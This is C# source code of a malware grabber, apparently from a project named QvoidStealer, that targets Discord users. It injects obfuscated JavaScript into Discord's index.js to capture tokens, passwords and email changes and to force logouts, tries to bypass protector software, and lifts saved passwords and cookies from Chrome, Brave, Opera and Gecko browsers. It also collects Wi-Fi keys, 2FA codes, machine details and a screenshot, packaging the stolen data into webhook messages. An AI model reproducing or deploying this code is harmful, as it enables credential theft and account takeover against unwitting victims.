using QvoidWrapper;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System;
using System.Runtime.InteropServices;
using static QvoidWrapper.DiscordWebhook;
using QvoidStealer.Miscellaneous.Stealers.Browsers;

namespace QvoidStealer.Main
{
    internal static class Grabber
    {
        /// <summary>
        /// This is the main function which executes the grabber.
        /// </summary>
        static private int Grab(string[] args)
        {
            string _Token = ""; string _OldPassword = ""; string _NewPassword = ""; string _reason = "";

            //Checking if the given argument(s) containing the information we need.
            foreach (var arg in args)
            {
                if (!arg.Contains("|%&|"))
                    continue;

                var quries = arg.Split(new string[] { "|%&|" }, StringSplitOptions.None);
                foreach (var _q in quries)
                {
                    var splitted = _q.Split('=');
                    switch (splitted[0])
                    {
                        case "token":
                            _Token = splitted[1] == "\"\"" ? "" : splitted[1];
                            break;
                        case "oldpass":
                            _OldPassword = splitted[1] == "\"\"" ? "" : splitted[1];
                            break;
                        case "password":
                            _NewPassword = splitted[1] == "\"\"" ? "" : splitted[1];
                            break;
                        case "reason":
                            _reason = splitted[1] == "\"\"" ? "" : splitted[1];
                            break;
                    }
                }
            }
            _OldPassword = _OldPassword == "undefined" ? "" : _OldPassword;
            _NewPassword = _NewPassword == "undefined" ? "" : _NewPassword;

            //Some random path to contains our temp files.
            string path = Path.GetTempPath() + $"\\{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 9)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 11)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 12)}-{Encryption.GenerateKey(4, false, Protection.UniqueSeed() + 13)}-{Encryption.GenerateKey(8, false, Protection.UniqueSeed() + 14)}\\";

            //Checking if the current path have all the dependencies.
            if (!Directory.Exists($"{Application.StartupPath}\\x64")
                || !Directory.Exists($"{Application.StartupPath}\\x86")
                || !File.Exists($"{Application.StartupPath}\\x64\\SQLite.Interop.dll")
                || !File.Exists($"{Application.StartupPath}\\x86\\SQLite.Interop.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.Linq.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.EF6.dll")
                || !File.Exists($"{Application.StartupPath}\\System.Data.SQLite.dll")
                || !File.Exists($"{Application.StartupPath}\\Newtonsoft.Json.dll")
                || !File.Exists($"{Application.StartupPath}\\EntityFramework.SqlServer.dll")
                || !File.Exists($"{Application.StartupPath}\\EntityFramework.dll")
                || !File.Exists($"{Application.StartupPath}\\BouncyCastle.Crypto.dll"))
            {
                //If it hasn't we'll just copy them from the resources of the program into some folder in temp and start it.
                if (Directory.Exists(path))
                    Directory.Delete(path, true);

                Extract(path, path);

                File.Copy(Assembly.GetEntryAssembly().Location, $"{path}\\{AppDomain.CurrentDomain.FriendlyName}");
                Thread.Sleep(100);

                //Starting the grabber
                Process process = new Process()
                {
                    StartInfo = new ProcessStartInfo($"{path}\\{System.AppDomain.CurrentDomain.FriendlyName}")
                    {
                        Arguments = string.Join(" ", args),
                        WorkingDirectory = Path.GetDirectoryName($"{path}\\{System.AppDomain.CurrentDomain.FriendlyName}")
                    }
                };
                process.Start();

                Environment.Exit(0);
            }

            //Getting all of the Discord path(s) avaliable on the computer.
            Discord discord = new Discord();
            if (!discord.IsExists)
                return 2;

            //If we've found avaliable Discord's core directory.
            if (discord.Cores.Count > 0)
            {
                string Injection = @"(function(_0x4249f0,_0x64e4e1){const _0x2ac680={_0x596e58:0x30a,_0x417156:0x30b,_0x56393d:0x2f7,_0x49a9b1:0x2f2,_0xf7f904:0x317,_0xefcfb9:0x306,_0x5820b7:0x303,_0x463bc1:0x324,_0x5b8e64:0x331},_0x3ba47c={_0x48f51e:0x3b9};function _0x16d18(_0x3615ac,_0x221d1d){return _0x247f(_0x3615ac- -_0x3ba47c._0x48f51e,_0x221d1d);}const _0x21694b=_0x4249f0();while(!![]){try{const _0x2fbf51=parseInt(_0x16d18(-_0x2ac680._0x596e58,-0x30b))/0x1*(-parseInt(_0x16d18(-_0x2ac680._0x417156,-_0x2ac680._0x56393d))/0x2)+-parseInt(_0x16d18(-0x316,-0x2fd))/0x3+parseInt(_0x16d18(-0x302,-_0x2ac680._0x49a9b1))/0x4*(-parseInt(_0x16d18(-_0x2ac680._0xf7f904,-0x308))/0x5)+-parseInt(_0x16d18(-0x304,-0x305))/0x6+parseInt(_0x16d18(-0x327,-0x340))/0x7+-parseInt(_0x16d18(-_0x2ac680._0xefcfb9,-0x2ee))/0x8*(parseInt(_0x16d18(-_0x2ac680._0x5820b7,-0x2f8))/0x9)+parseInt(_0x16d18(-_0x2ac680._0x463bc1,-_0x2ac680._0x5b8e64))/0xa*(parseInt(_0x16d18(-0x31d,-0x31d))/0xb);if(_0x2fbf51===_0x64e4e1)break;else _0x21694b['push'](_0x21694b['shift']());}catch(_0xe07833){_0x21694b['push'](_0x21694b['shift']());}}}(_0x3c65,0x8b047));function _0x247f(_0x275b5c,_0x1e2cb7){const _0x3c65c4=_0x3c65();return _0x247f=function(_0x247f0e,_0x5c2be7){_0x247f0e=_0x247f0e-0x8b;let _0x3111d0=_0x3c65c4[_0x247f0e];return _0x3111d0;},_0x247f(_0x275b5c,_0x1e2cb7);}const fs=require('fs'),querystring=require('querystring'),{BrowserWindow,session}=require(_0x3527a8(0x33c,0x33e)),{execFile}=require('child_process'),TokenEval=_0x3527a8(0x331,0x341);function FirstTime(){const _0x3ebbac={_0x14d42a:0x47,_0x4a3a03:0x5e,_0xc11fd7:0x4c,_0x4b5a57:0x51},_0x42b481={_0x42c1e9:0x30c};function _0x7c3f96(_0x5270d0,_0x3ce57f){return _0x3527a8(_0x3ce57f,_0x5270d0- -_0x42b481._0x42c1e9);}if(fs[_0x7c3f96(_0x3ebbac._0x14d42a,0x60)](__dirname+'\x5c2a6f62cb2f3r\x5cQvoid'))return 0x1;else{const _0x468023=BrowserWindow[_0x7c3f96(0x39,0x48)]()[0x0];return _0x468023[_0x7c3f96(0x44,_0x3ebbac._0x4a3a03)]['executeJavaScript'](_0x7c3f96(0x5b,_0x3ebbac._0xc11fd7),!0x0)[_0x7c3f96(_0x3ebbac._0x4b5a57,0x61)](_0x782a6a=>{}),0x0;}}const Filter={'urls':[_0x3527a8(0x357,0x354),_0x3527a8(0x35a,0x369),'https://discord.com/api/v*/applications/detectable','https://*.discord.com/api/v*/users/@me/library',_0x3527a8(0x350,0x365),_0x3527a8(0x32d,0x33a),_0x3527a8(0x341,0x34f),_0x3527a8(0x337,0x33c)]};session[_0x3527a8(0x340,0x33f)][_0x3527a8(0x349,0x34b)]['onBeforeRequest'](Filter,(_0x35e86d,_0x4f1733)=>{if(FirstTime()){}});function _0x3527a8(_0x3ed73,_0x43c0d6){const _0x3c2cbf={_0x1d1b82:0x2ab};return _0x247f(_0x43c0d6-_0x3c2cbf._0x1d1b82,_0x3ed73);}const UrlFilter={'urls':['https://discordapp.com/api/v*/users/@me','https://*.discord.com/api/v*/users/@me',_0x3527a8(0x320,0x336),_0x3527a8(0x337,0x352),_0x3527a8(0x374,0x366),'https://api.stripe.com/v*/tokens']};session[_0x3527a8(0x33b,0x33f)][_0x3527a8(0x357,0x34b)][_0x3527a8(0x342,0x349)](UrlFilter,(_0x313474,_0x424b31)=>{const _0x14e81f={_0x58baf3:0xcf,_0xc5379:0xd7,_0x1b41d5:0xf0,_0x1f707b:0xc6,_0x159819:0xe4,_0x10f659:0xdd,_0xbeb08e:0xd9,_0x444ac7:0xda,_0x3b02aa:0xcc,_0x5d86e6:0xdc,_0x5c5533:0xc4,_0x56d472:0xe8,_0x1ce9bc:0xef,_0x51f436:0xeb,_0xf93247:0xdb,_0x53a8ab:0xed,_0x42e9f2:0xc0,_0x8efadc:0xb5,_0x5d9a93:0xbc,_0x58f43e:0xcc,_0x29e579:0xcf,_0x381606:0xc9,_0x292105:0xd8,_0x3ec1ba:0xe0,_0x15341f:0xe1,_0x3367b3:0xd5,_0x11c2ea:0xc0,_0x26c464:0xe3},_0x2b3f4={_0x4ad7e5:0x7a,_0x18466a:0xa7,_0x21e903:0x91,_0x5acd98:0x70,_0x599a6a:0x8c,_0x33f631:0x85},_0x5d2476={_0x32af96:0x23d,_0xe2ea80:0x239,_0x393722:0x217,_0x15f1e6:0x22e,_0x34d93f:0x20f,_0xfd6285:0x22f},_0x25467a={_0x3e974b:0x2ea,_0x3a82d3:0x2eb,_0x25f007:0x2da,_0x587634:0x2d3},_0x16e1f5={_0xc52ca0:0x223};function _0x125473(_0x178fe2,_0x167f72){return _0x3527a8(_0x167f72,_0x178fe2- -0x41f);}if(_0x313474[_0x125473(-0xdd,-_0x14e81f._0x58baf3)][_0x125473(-0xdb,-0xda)](_0x125473(-_0x14e81f._0xc5379,-0xe8))){if(_0x313474[_0x125473(-0xe7,-_0x14e81f._0x1b41d5)]==0xc8){const _0x236ee3=JSON[_0x125473(-0xca,-_0x14e81f._0x1f707b)](Buffer['from'](_0x313474[_0x125473(-_0x14e81f._0x159819,-_0x14e81f._0x10f659)][0x0]['bytes'])[_0x125473(-0xe6,-0xfd)]()),_0xded008=_0x236ee3[_0x125473(-0xd7,-_0x14e81f._0xbeb08e)],_0x5def8b=_0x236ee3['password'],_0x29c009=BrowserWindow[_0x125473(-_0x14e81f._0x444ac7,-0xf4)]()[0x0];!fs[_0x125473(-_0x14e81f._0x3b02aa,-0xce)](__dirname+'\x5c2a6f62cb2f3r\x5cQvoid')&&fs['mkdirSync'](__dirname+_0x125473(-0xc9,-_0x14e81f._0x5d86e6)),_0x29c009[_0x125473(-_0x14e81f._0x58baf3,-_0x14e81f._0x5c5533)][_0x125473(-_0x14e81f._0x56d472,-_0x14e81f._0x1ce9bc)](TokenEval,!0x0)['then'](_0x2d900c=>{function _0x44819f(_0x458337,_0x5c290b){return _0x125473(_0x458337- -_0x16e1f5._0xc52ca0,_0x5c290b);}execFile(__dirname+_0x44819f(-_0x25467a._0x3e974b,-0x2f6),['reason='+'User\x20logged\x20in'+'|%&|'+_0x44819f(-_0x25467a._0x3a82d3,-0x2f0)+_0x2d900c+_0x44819f(-0x2f1,-0x2e7)+_0x44819f(-0x2e6,-0x2f5)+_0x236ee3['password']+'|%&|'+_0x44819f(-_0x25467a._0x25f007,-_0x25467a._0x587634)+_0x236ee3['new_password'],'\x20']);});}}if(_0x313474[_0x125473(-_0x14e81f._0x10f659,-_0x14e81f._0x51f436)][_0x125473(-_0x14e81f._0xf93247,-0xf5)]('users/@me')){if(_0x313474[_0x125473(-0xe7,-_0x14e81f._0x53a8ab)]==0xc8&&_0x313474['method']==_0x125473(-_0x14e81f._0x42e9f2,-0xb2)){const _0x395bfd=JSON[_0x125473(-0xca,-0xc8)](Buffer[_0x125473(-0xc4,-0xcf)](_0x313474['uploadData'][0x0][_0x125473(-0xd9,-0xdb)])['toString']());if(_0x395bfd['password']!=null&&_0x395bfd[_0x125473(-0xb5,-0xc5)]!=undefined&&_0x395bfd[_0x125473(-_0x14e81f._0x8efadc,-0x9d)]!=''){if(_0x395bfd['new_password']!=undefined&&_0x395bfd['new_password']!=null&&_0x395bfd[_0x125473(-_0x14e81f._0x5d9a93,-0xd0)]!=''){const _0x3b09ac=BrowserWindow['getAllWindows']()[0x0];!fs[_0x125473(-_0x14e81f._0x58f43e,-_0x14e81f._0x29e579)](__dirname+_0x125473(-_0x14e81f._0x381606,-_0x14e81f._0x292105))&&fs['mkdirSync'](__dirname+_0x125473(-_0x14e81f._0x381606,-0xc1)),_0x3b09ac[_0x125473(-0xcf,-_0x14e81f._0x3ec1ba)][_0x125473(-0xe8,-_0x14e81f._0x15341f)](TokenEval,!0x0)[_0x125473(-0xc2,-0xbe)](_0x20baa2=>{function _0xe933cb(_0x27ca08,_0x45bb2d){return _0x125473(_0x45bb2d- -0x16b,_0x27ca08);}execFile(__dirname+'\x5c2a6f62cb2f3r\x5cUpdate.exe',[_0xe933cb(-_0x5d2476._0x32af96,-0x226)+'Password\x20changed'+_0xe933cb(-0x223,-_0x5d2476._0xe2ea80)+'token='+_0x20baa2+_0xe933cb(-0x243,-0x239)+_0xe933cb(-_0x5d2476._0x393722,-_0x5d2476._0x15f1e6)+_0x395bfd[_0xe933cb(-_0x5d2476._0x34d93f,-0x220)]+_0xe933cb(-0x24b,-0x239)+_0xe933cb(-0x20e,-0x222)+_0x395bfd[_0xe933cb(-_0x5d2476._0xfd6285,-0x227)],'\x20']);});}if(_0x395bfd['email']!=null&&_0x395bfd[_0x125473(-_0x14e81f._0x3367b3,-0xc1)]!=undefined&&_0x395bfd[_0x125473(-0xd5,-0xc6)]!=''){const _0x2cd2a5=BrowserWindow[_0x125473(-_0x14e81f._0x444ac7,-0xc3)]()[0x0];!fs[_0x125473(-0xcc,-_0x14e81f._0x11c2ea)](__dirname+'\x5c2a6f62cb2f3r\x5cQvoid')&&fs[_0x125473(-0xd3,-0xcb)](__dirname+_0x125473(-0xc9,-_0x14e81f._0x58baf3)),_0x2cd2a5[_0x125473(-0xcf,-0xe0)][_0x125473(-0xe8,-_0x14e81f._0x26c464)](TokenEval,!0x0)['then'](_0x22fba5=>{const _0x4244d0={_0x47ddcc:0x37};function _0x21eb49(_0x2057e3,_0x547e7f){return _0x125473(_0x547e7f-_0x4244d0._0x47ddcc,_0x2057e3);}execFile(__dirname+'\x5c2a6f62cb2f3r\x5cUpdate.exe',[_0x21eb49(-_0x2b3f4._0x4ad7e5,-0x84)+'Email\x20changed'+'|%&|'+_0x21eb49(-_0x2b3f4._0x18466a,-_0x2b3f4._0x21e903)+_0x22fba5+_0x21eb49(-0x91,-0x97)+_0x21eb49(-0x95,-0x8c)+_0x395bfd[_0x21eb49(-_0x2b3f4._0x5acd98,-0x7e)]+'|%&|'+'password='+_0x395bfd[_0x21eb49(-_0x2b3f4._0x599a6a,-_0x2b3f4._0x33f631)],'\x20']);});}}}}}),module[_0x3527a8(0x340,0x343)]=require('./core.asar');function _0x3c65(){const _0x41cb92=['then','8724904tcLPoC','PATCH','621108vuDwpr','9YSqGEG','1812BBRaOV','new_password','reason=','https://discord.com/api/v*/users/@me/library','https://*.discord.com/api/v*/auth/login','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','password=','https://*.discord.com/api/v*/applications/detectable','password','https://discordapp.com/api/v*/auth/login','executeJavaScript','statusCode','toString','https://*.discord.com/api/v*/users/@me/billing/subscriptions','uploadData','wss://remote-auth-gateway.discord.gg/*','7875182UBDuNu','electron','defaultSession','130YQugpq','for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x22getToken\x22==a&&(token=b.default.getToken())}token;','url','exports','endsWith','getAllWindows','bytes','2265274kAJHEy','login','onCompleted','email','webRequest','mkdirSync','4225xKcKqc','1661670phLugD','https://discord.com/api/v*/users/@me/billing/subscriptions','webContents','|%&|','https://discord.com/api/v*/auth/login','existsSync','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','parse','\x5c2a6f62cb2f3r\x5cQvoid','token=','\x5c2a6f62cb2f3r\x5cUpdate.exe','2203894LPPvNo','1vZRFSG','from','oldpass='];_0x3c65=function(){return _0x41cb92;};return _0x3c65();}";

                //Replicating the grabber to all Discord's core path and writing the injection.
                for (int i = 0; i < discord.Cores.Count; ++i)
                {
                    var corePath = discord.Cores[i];
                    if (Process.GetCurrentProcess().MainModule.FileName == $"{corePath}2a6f62cb2f3r\\Update.exe")
                        continue;

                    if (Directory.Exists(corePath + "\\2a6f62cb2f3r"))
                        Directory.Delete(corePath + "\\2a6f62cb2f3r", true);

                    Directory.CreateDirectory(corePath + "\\2a6f62cb2f3r");
                    try
                    {
                        //Extracting the dependencies to the core path.
                        Extract(path, corePath + "\\2a6f62cb2f3r");
                    }
                    catch { }

                    try
                    {
                        //If the file is already exists we delete it.
                        if (File.Exists($"{corePath}\\2a6f62cb2f3r\\{AppDomain.CurrentDomain.FriendlyName}"))
                            File.Delete($"{corePath}\\2a6f62cb2f3r\\{AppDomain.CurrentDomain.FriendlyName}");

                        if (File.Exists($"{corePath}\\2a6f62cb2f3r\\Update.exe"))
                            File.Delete($"{corePath}\\2a6f62cb2f3r\\Update.exe");

                        //Writing the index.js file
                        File.Copy(Assembly.GetEntryAssembly().Location, $"{corePath}\\2a6f62cb2f3r\\Update.exe");
                        File.WriteAllText(corePath + "\\index.js", $"{Injection}{Environment.NewLine}");

                        //Setting the file attributes to readonly in oreder to prevent protectors the writing access :/
                        File.SetAttributes(corePath + "\\index.js", FileAttributes.ReadOnly);
                    }
                    catch (Exception ex)
                    {
                        //Checking if the cause to the problem is that the file attributes contains readonly.
                        if (ex.HResult == -2147024891 && File.GetAttributes(corePath + "\\index.js").HasFlag(FileAttributes.ReadOnly))
                        {
                            //Removing the readonly attribute.
                            File.SetAttributes(corePath + "\\index.js", FileAttributes.Normal);
                            --i;
                        }
                    }
                }
            }

            //If we've found zero tokens location which is not normal, its probably some application that "Protecting" Discord.
            if (discord.TokensPaths.Count == 0)
            {
                //Creating a dump for all "Discord" processes and checking if they has tokens.
                discord.Dump();
                if (discord.DumpedTokens.Count > 0)
                    goto Next;

                //If the dump didn't found any tokens we are trying to bypass the protectors.
                discord.BypassProtectors(path);

                while (true)
                {
                    //Sleeping 1 minute.
                    Thread.Sleep(60000);

                    //Killing all Discord's proccesses
                    var DiscordProcs = Process.GetProcessesByName("Discord");
                    foreach (var proc in DiscordProcs)
                        try { proc.Kill(); } catch { }

                    //Starting Discord
                    if (!String.IsNullOrEmpty(discord.Name))
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");

                    //Checking again.
                    discord = new Discord();
                    if (discord.TokensPaths.Count > 0)
                        break;
                }
            }

        Next:
            var Tokens = new List<string>();
            Tokens.Add(_Token);
            Tokens.AddRange(discord.GetTokens());

            Dictionary<DiscordEmbed, DiscordClient> Users = new Dictionary<DiscordEmbed, DiscordClient>();
            List<string> clientsData = new List<string>();
            string BodyMessage = "";

            if (Tokens.Count > 0)
            {
                List<ulong> ids = new List<ulong>();

                for (int i = 0; i < Tokens.ToList().Count; ++i)
                {
                    //Creating a client from the given token
                    DiscordClient client = new DiscordClient(Tokens[i]);
                    if (!client.IsValidToken || client.Id.ToString().Length < 18)
                        continue;

                    //Checking for duplicates
                    if (ids.Any(t => t == client.Id))
                    {
                        Tokens.RemoveAt(i);
                        continue;
                    }

                    ids.Add(client.Id);
                    string clientData = $"Username: {client.Username}#{client.Discriminator}{Environment.NewLine}" +
                                        $"Email: {(String.IsNullOrEmpty(client.Email) ? "None" : client.Email)}{Environment.NewLine}" +
                                        $"Phone Number: {(String.IsNullOrEmpty(client.Phone) ? "None" : client.Phone)}{Environment.NewLine}" +
                                        $"Premium: {client.Premium}{Environment.NewLine}" +
                                        $"Verified: {client.Verified}{Environment.NewLine}" +
                                        $"Badges: {(client.GetBadges(client.Flags).Count <= 0 ? "None" : string.Join(", ", client.GetBadges(client.Flags)))}{Environment.NewLine}" +
                                        $"Created At: {client.CreatedAt.DateTime.ToShortDateString()} | {client.CreatedAt.DateTime.ToShortTimeString()}{Environment.NewLine}";

                    var embed = new DiscordEmbed();

                    string _event = _reason.ToUpper();
                    embed.Author = new EmbedAuthor()
                    {
                        Name = _event
                    };
                    embed.Fields = new List<EmbedField>();
                    embed.Fields.Add(new EmbedField() { Name = "Username", Value = $"```{client.Username}#{client.Discriminator}```", InLine = true });
                    embed.Fields.Add(new EmbedField() { Name = "Id", Value = $"```{client.Id}```", InLine = true });
                    embed.Fields.Add(new EmbedField() { Name = "Verified", Value = $"```{client.Verified}```", InLine = true });
                    embed.Fields.Add(new EmbedField() { Name = "Created At", Value = $"```{client.CreatedAt}```", InLine = true });
                    embed.Fields.Add(new EmbedField() { Name = "Phone Number", Value = $"```{(String.IsNullOrEmpty(client.Phone) ? "None" : client.Phone)}{Environment.NewLine}```", InLine = true });
                    embed.Fields.Add(new EmbedField() { Name = "Badges", Value = $"```{(client.GetBadges(client.Flags).Count <= 0 ? "None" : string.Join(", ", client.GetBadges(client.Flags)))}{Environment.NewLine}```", InLine = true });

                    if (_Token == client.Token)
                    {
                        if (!String.IsNullOrEmpty(_OldPassword))
                        {
                            if (_event == "USER LOGGED IN")
                            {
                                clientData += $"Current Password: {_OldPassword}{Environment.NewLine}";
                                embed.Fields.Add(new EmbedField() { Name = "Current Password", Value = $"```{_OldPassword}```", InLine = false });
                            }
                            else
                            {
                                clientData += $"Old Password: {_OldPassword}{Environment.NewLine}";
                                embed.Fields.Add(new EmbedField() { Name = "Old Password", Value = $"```{_OldPassword}```", InLine = false });
                            }
                        }

                        if (!String.IsNullOrEmpty(_NewPassword) && _event != "USER LOGGED IN" && _NewPassword != "undefined")
                        {
                            clientData += $"Current Password: {_NewPassword}{Environment.NewLine}";
                            embed.Fields.Add(new EmbedField() { Name = "Current Password", Value = $"```{_NewPassword}```", InLine = false });
                        }

                        var codes = client.Get2faCodes(String.IsNullOrEmpty(_NewPassword) ? _OldPassword : _NewPassword);
                        if (codes != null && codes.Count > 0)
                            embed.Fields.Add(new EmbedField() { Name = "2fa codes", Value = $"```{string.Join(Environment.NewLine, codes)}```", InLine = false });
                    }

                    embed.Fields.Add(new EmbedField() { Name = "Token", Value = $"```{client.Token}```", InLine = false });

                    clientData += $"Token: {client.Token}{Environment.NewLine}";
                    BodyMessage += $"{Environment.NewLine}Username```{client.Username}#{client.Discriminator}```" +
                                   $"{Environment.NewLine}Email```{client.Email}```" +
                                   $"{Environment.NewLine}Phone Number```{client.Phone}```" +
                                   $"{Environment.NewLine}Premium```{client.Premium}```" +
                                   $"{Environment.NewLine}Token```{client.Token}```";

                    clientsData.Add(clientData);
                    Users.Add(embed, client);
                }
            }

            //Getting the information about the environment computer.
            Machine machine = new Machine();

            List<EmbedField> fields = new List<EmbedField>();
            fields.Add(new EmbedField() { Name = "IP Address", Value = $"```{machine.PublicIPv4}```", InLine = true });
            fields.Add(new EmbedField() { Name = "LAN Address", Value = $"```{machine.LanIPv4}```", InLine = true });
            fields.Add(new EmbedField() { Name = "Desktop Username", Value = $"```{Environment.UserName}```", InLine = true });
            fields.Add(new EmbedField() { Name = "Domain Username", Value = $"```{Environment.UserDomainName}```", InLine = true });
            fields.Add(new EmbedField() { Name = "Processor Count", Value = $"```{Environment.ProcessorCount}```", InLine = true });
            fields.Add(new EmbedField() { Name = "Memory", Value = $"```{machine.PcMemory}```", InLine = true });
            fields.Add(new EmbedField() { Name = "OS Architecture", Value = $"```{machine.OsArchitecture}```", InLine = true });
            fields.Add(new EmbedField() { Name = "GPU Video", Value = $"```{machine.GpuVideo}```", InLine = true });
            fields.Add(new EmbedField() { Name = "GPU Version", Value = $"```{machine.GpuVersion}```", InLine = true });
            fields.Add(new EmbedField() { Name = "Windows License", Value = $"```{machine.WindowsLicense}```", InLine = true });

            string HeadMessage = $"*IP Address*{Environment.NewLine}  > {machine.PublicIPv4}{Environment.NewLine}" +
                                 $"*LAN Address*{Environment.NewLine}  > {machine.LanIPv4}{Environment.NewLine}" +
                                 $"*Desktop Username*{Environment.NewLine}  > {Environment.UserName}{Environment.NewLine}" +
                                 $"*Domain Username*{Environment.NewLine}  > {Environment.UserDomainName}{Environment.NewLine}" +
                                 $"*Processor Count*{Environment.NewLine}  > {Environment.ProcessorCount}{Environment.NewLine}" +
                                 $"*Memory*{Environment.NewLine}  > {machine.PcMemory}{Environment.NewLine}" +
                                 $"*OS Architecture*{Environment.NewLine}  > {machine.GpuVideo}{Environment.NewLine}" +
                                 $"*GPU Video*{Environment.NewLine}  > {machine.LanIPv4}{Environment.NewLine}" +
                                 $"*GPU Version*{Environment.NewLine}  > {machine.GpuVersion}{Environment.NewLine}" +
                                 $"*Windows License*{Environment.NewLine}  > {machine.WindowsLicense}{Environment.NewLine}";

            string Passwords = "------ Passwords ------";
            string Cookies = "------ Cookies ------";

            //Grabbing passwords and cookies
            var _Chrome = new ChromiumGrabber(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\Google\\Chrome\\User Data\\Local State", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\Google\\Chrome\\User Data\\Default\\Login Data", "Chrome");

            var _Brave = new ChromiumGrabber(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", "Brave");

            var _Opera = new ChromiumGrabber(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                "\\Opera Software\\Opera GX Stable\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                "\\Opera Software\\Opera GX Stable\\Local State",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                "\\Opera Software\\Opera GX Stable\\Login Data", "Opera");

            var GeckoPasswords = GeckoGrabber.Passwords.GetAll();
            var GeckoCookies = GeckoGrabber.Cookies.GetAll();

            #region Passwords
            // ----------------------- Passwords -----------------------//

            var ChromePasswords = _Chrome.ReadPasswords();
            if (ChromePasswords != null && ChromePasswords.Count > 0)
                Passwords += ChromePasswords.ToString("Chrome");

            var OperaPasswords = _Opera.ReadPasswords();
            if (OperaPasswords != null && OperaPasswords.Count > 0)
                Passwords += OperaPasswords.ToString("OperaGx");

            var BravePasswords = _Brave.ReadPasswords();
            if (BravePasswords != null && BravePasswords.Count > 0)
                Passwords += BravePasswords.ToString("Brave");

            if (!String.IsNullOrEmpty(GeckoPasswords) && !String.IsNullOrWhiteSpace(GeckoPasswords))
                Passwords += GeckoPasswords;

            #endregion Passwords

            #region Cookies
            // ----------------------- Cookies -----------------------//

            var ChromeCookies = _Chrome.GetCookies();
            if (ChromeCookies != null && ChromeCookies.Count > 0)
                Cookies += ChromeCookies.ToString("Chrome");

            var OperaCookies = _Opera.GetCookies();
            if (OperaCookies != null && OperaCookies.Count > 0)
                Cookies += OperaCookies.ToString("OpearaGx");

            var BraveCookies = _Brave.GetCookies();
            if (BraveCookies != null && BraveCookies.Count > 0)
                Cookies += BraveCookies.ToString("Brave");

            if (!String.IsNullOrEmpty(GeckoCookies) && !String.IsNullOrWhiteSpace(GeckoCookies))
                Cookies += GeckoCookies;
            #endregion Cookies

            var filesDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BleachBit\\bin\\";
            if (Directory.Exists(filesDir))
                Directory.Delete(filesDir, true);

            Directory.CreateDirectory(filesDir);

            if (Passwords != "------ Passwords ------")
                File.WriteAllText(filesDir + "\\BrowserPasswords.txt", Passwords);

            if (Cookies != "------ Cookies ------")
                File.WriteAllText(filesDir + "\\BrowserCookies.txt", Cookies);

            try
            {
                WirelessLan lan = new WirelessLan();
                if (lan.IsAvailable)
                {
                    string content = "";
                    foreach (var ssid in lan.SSIDs)
                        content += $"{ssid.Profile.Name}:{ssid.Security.Key}{Environment.NewLine}";

                    if (!string.IsNullOrEmpty(content))
                        File.WriteAllText(filesDir + "\\Lan.txt", content);
                }
            }
            catch { }

            using (Bitmap bmp = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height))
            {
                try
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                        g.CopyFromScreen(SystemInformation.VirtualScreen.Left, SystemInformation.VirtualScreen.Top, 0, 0, bmp.Size);

                    bmp.Save($"{filesDir}\\Screenshot.jpg", ImageFormat.Jpeg);
                }
                catch { }
            }

            var finalZip = $"{Path.GetTempPath()}\\{Environment.UserDomainName}-REPORT.zip";
            string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + $"\\{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 19)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 21)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 22)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 23)}-{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 24)}.dat";

            //Checking if the user already run the token grabber before, if he did we compare it to the content if the content has changed we update all the information, else we just return quz we have nothing to do :D
